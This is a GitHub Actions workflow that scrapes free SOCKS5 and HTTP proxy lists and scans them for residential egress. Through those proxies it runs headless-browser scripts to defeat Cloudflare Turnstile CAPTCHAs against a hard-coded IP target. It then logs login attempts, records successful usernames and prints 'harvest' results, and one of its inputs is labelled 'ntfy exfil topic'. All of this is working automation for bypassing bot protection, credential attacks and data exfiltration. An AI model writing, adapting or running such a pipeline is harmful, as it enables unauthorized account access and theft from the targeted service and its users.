name: i53759turnstile
on:
  workflow_dispatch:
    inputs:
      nt:
        description: "ntfy exfil topic"
        required: false
        default: ""
permissions:
  contents: read
jobs:
  solve:
    runs-on: ubuntu-latest
    timeout-minutes: 55
    steps:
      - uses: actions/checkout@v4

      - name: runner egress + refresh fresh proxy lists
        run: |
          echo "=== runner ==="; id -u; uname -r
          (curl -s --max-time 10 https://api.ipify.org || echo noip) | sed 's/^/RUNNER_EGRESS_IP=/'
          curl -s -m 45 "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks5&proxy_format=ipport&format=text" -o fresh_socks5.txt || true
          curl -s -m 45 "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text" -o fresh_http.txt || true
          curl -s -m 45 "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt" -o fresh_s5b.txt || true
          wc -l proxies.txt fresh_*.txt 2>/dev/null | tail -6

      - name: install deps (xvfb + real chrome + playwright)
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq xvfb >/dev/null 2>&1 || true
          python3 -m pip install --quiet --upgrade pip
          python3 -m pip install --quiet playwright
          python3 -m playwright install --with-deps chromium 2>&1 | tail -2
          (google-chrome --version || chromium --version || echo no-system-chrome) 2>&1 | head -2

      - name: runtime proxy scan (target + cloudflare TLS + egress ASN)
        run: |
          timeout 600 python3 scan_rt.py proxies.txt fresh_socks5.txt fresh_http.txt fresh_s5b.txt 2>&1 | tail -100
          echo "=== best ==="; python3 -c "import json;d=json.load(open('best.json'));print(d['best']);print([(u['proto'],u['proxy'],u.get('egress'),u.get('hosting'),u.get('isp')) for u in d['usable']])"

      - name: solve DIRECT (fast control, same minimal-doc+widget)
        env:
          NT: ${{ github.event.inputs.nt }}
        run: |
          MODE=direct BUDGET=60 xvfb-run -a --server-args="-screen 0 1280x900x24" python3 solver3.py 2>&1 | tail -40 || true
          python3 -c "import json;d=json.load(open('results_direct.json'));print('DIRECT_TOKEN_LEN',d['solve']['token_len'],'err',d['solve'].get('err'),'frames',d['solve'].get('frames'))" 2>/dev/null || echo "no results_direct.json"

      - name: solve via residential upstreams (bridge -> socks5/http) + first real credential comparison
        env:
          NT: ${{ github.event.inputs.nt }}
        run: |
          set -x
          for i in 0 1 2 3 4 5; do
            T=$(python3 -c "import json;print(json.load(open('results_direct.json'))['solve']['token_len'])" 2>/dev/null || echo 0)
            [ "$T" != "0" ] && echo "direct already got token" && break
            U=$(python3 -c "import json;d=json.load(open('best.json'));print(d['best'][$i] if len(d['best'])>$i else '')" 2>/dev/null)
            [ -z "$U" ] && continue
            echo "##### upstream $i = $U"
            UPSTREAMS="$U" python3 bridge.py 8899 > bridge_$i.log 2>&1 &
            BP=$!; sleep 2
            curl -s -m 40 -x http://127.0.0.1:8899 -o /dev/null -w "bridge->target code=%{http_code} t=%{time_total}\n" http://135.148.204.37/api/status || true
            curl -s -m 40 -x http://127.0.0.1:8899 -o /dev/null -w "bridge->cfapi code=%{http_code} size=%{size_download}\n" "https://challenges.cloudflare.com/turnstile/v0/api.js" || true
            MODE=proxy BUDGET=150 NT="$NT" xvfb-run -a --server-args="-screen 0 1280x900x24" python3 solver3.py 2>&1 | tail -30 || true
            kill $BP 2>/dev/null
            cp results_proxy.json results_proxy_$i.json 2>/dev/null || true
            echo "--- bridge log ---"; tail -12 bridge_$i.log
            T=$(python3 -c "import json;print(json.load(open('results_proxy_$i.json'))['solve']['token_len'])" 2>/dev/null || echo 0)
            echo "##### attempt $i token_len=$T"
            [ "$T" != "0" ] && break
          done

      - name: summarize (attempts, logins, harvest)
        if: always()
        run: |
          python3 - <<'EOF'
          import json,glob
          for f in sorted(glob.glob('results_*.json')):
              try: d=json.load(open(f))
              except Exception: continue
              s=d.get('solve',{})
              print('==',f,'mode',d.get('mode'),'token_len',s.get('token_len'),'frames',len(s.get('frames') or []))
              print('   console',s.get('console')[:8])
              print('   reqfail',s.get('reqfail')[:6])
              for a in d.get('attempts',[]): print('   LOGIN',a['u'],a['status'],a['body'][:150])
              if d.get('login'): print('   LOGIN_SUCCESS',d['login']['username'])
              for k,v in (d.get('harvest') or {}).items(): print('   HARVEST',k,v.get('status'),str(v.get('body'))[:200])
          print('== best.json ==')
          try:
              b=json.load(open('best.json')); print(b['best'])
              for u in b.get('usable',[]): print('  ',u['proto'],u['proxy'],u.get('egress'),u.get('hosting'),u.get('isp'))
          except Exception as e: print('no best.json',e)
          EOF

      - name: upload diagnostics
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: diag53759
          path: |
            results_*.json
            best.json
            bridge_*.log
            all_proxies*.txt
            fresh_*.txt
            *.png
            last_*.html
          if-no-files-found: ignore